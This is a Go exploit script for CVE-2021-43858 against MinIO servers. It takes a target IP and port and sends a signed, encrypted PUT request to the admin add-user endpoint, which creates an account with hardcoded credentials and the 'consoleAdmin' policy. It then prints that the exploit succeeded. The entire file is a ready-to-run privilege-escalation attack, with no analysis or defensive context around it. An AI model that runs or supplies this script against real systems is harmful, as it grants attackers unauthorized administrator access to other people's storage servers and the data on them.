package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"time"

	madmin "github.com/minio/madmin-go"
	"github.com/minio/minio-go/pkg/s3utils"
	"github.com/minio/minio-go/v7/pkg/signer"
)

const (
	testDefaultTimeout = 30 * time.Second
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("[-] usage: go run exp.go ip port")
		return
	}

	ip := os.Args[1]
	port := os.Args[2]
	base := fmt.Sprintf("http://%v:%v", ip, port)

	// CVE-2021-43858 用户权限提升
	accessKey := "123"
	secretKey := "12345678"

	ctx, cancel := context.WithTimeout(context.Background(), testDefaultTimeout)
	defer cancel()

	fmt.Println("[+] accessKey: ", accessKey)
	fmt.Println("[+] secretKey: ", secretKey)

	urlValue := url.Values{}
	urlValue.Add("[+] accessKey", accessKey)

	u, err := url.Parse(fmt.Sprintf("%s/minio/admin/v3/add-user?%s", base, s3utils.QueryEncode(urlValue)))

	if err != nil {
		fmt.Println("[-] unexpected url parse err: ", err)
		return
	}

	fmt.Println("[+] vuln_url: ", u.String())
	req, err := http.NewRequestWithContext(ctx, http.MethodPut, u.String(), nil)
	if err != nil {
		fmt.Println("[-] unexpected new request error: ", err)
		return
	}

	// 构造数据
	reqBodyArg := madmin.UserInfo{
		SecretKey:  secretKey,
		PolicyName: "consoleAdmin",
		Status:     madmin.AccountEnabled,
	}
	buf, err := json.Marshal(reqBodyArg)
	if err != nil {
		fmt.Println("[-] unexpected json encode err: ", err)
		return
	}
	buf, err = madmin.EncryptData(secretKey, buf)
	if err != nil {
		fmt.Println("[-] unexpected encryption err: ", err)
		return
	}

	req.ContentLength = int64(len(buf))
	sum := sha256.Sum256(buf)
	req.Header.Set("X-Amz-Content-Sha256", hex.EncodeToString(sum[:]))
	req.Body = ioutil.NopCloser(bytes.NewReader(buf))
	req = signer.SignV4(*req, accessKey, secretKey, "", "")

	// 发送请求
	var httpClient http.Client
	resp, err := httpClient.Do(req)
	if err != nil {
		fmt.Println("[-] unexpected request err: ", err)
		return
	}

	if resp.StatusCode != 200 {
		fmt.Println("[-] got unexpected response: ", resp)
		return
	}

	fmt.Println("[+] CVE-2021-43858 exploited successfully!")
}
